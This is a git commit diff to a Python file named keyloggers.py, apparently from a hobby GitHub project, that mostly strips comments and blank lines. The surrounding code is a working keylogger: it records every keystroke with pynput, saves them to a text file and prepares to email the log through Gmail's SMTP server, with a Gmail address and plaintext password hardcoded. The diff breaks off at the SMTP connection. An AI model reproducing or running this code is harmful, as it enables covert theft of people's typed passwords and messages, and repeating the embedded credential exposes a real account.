28640421edd52b6303bbdb29cc2aa03b865ce23e
Raj kumar <134830670+Rajkumar799@users.noreply.github.com>
2023-07-11 22:49:18 +0530

    Update keyloggers.py

--- project/keyloggers.py
+++ project/keyloggers.py
@@ -1,9 +1,8 @@
 from pynput import keyboard
 import smtplib,ssl
-sender_mail = "psychoblackheart17@gmail.com"     # Replace user@domain.com with your email id (everywhere)
-#prefer using your own email id for receiver's as well.
-receiver_mail = "psychoblackheart17@gmail.com"  # Replace user@domain.com with your email id (everywhere)
-password = "Rajkumar@123"              # Enter your Password here
+sender_mail = "psychoblackheart17@gmail.com"     
+receiver_mail = "psychoblackheart17@gmail.com" 
+password = "Rajkumar@123"              
 port = 587
 message = """From: psychoblackheart17@gmail.com
 To: psychoblackheart17@gmail.com                        
@@ -14,8 +13,6 @@ def write(text):
     with open("keylogger.txt",'a') as f: 
         f.write(text)
         f.close()
-
-
 def on_key_press(Key):
     try:
         if(Key == keyboard.Key.enter):
@@ -35,19 +32,14 @@ def on_key_press(Key):
             print("\n{} Pressed\n".format(Key))
 
 def on_key_release(Key):
-    #This stops the Listener/Keylogger.
-    #You can use any key you like by replacing "esc" with the key of your choice
     if(Key == keyboard.Key.esc):
         return False
-
 with keyboard.Listener(on_press= on_key_press,on_release= on_key_release) as listener:
     listener.join()
-
 with open("keylogger.txt",'r') as f:
     temp = f.read()
     message = message + str(temp)
     f.close()
-
 
 context = ssl.create_default_context()
 server = smtplib.SMTP('smtp.gmail.com', port)
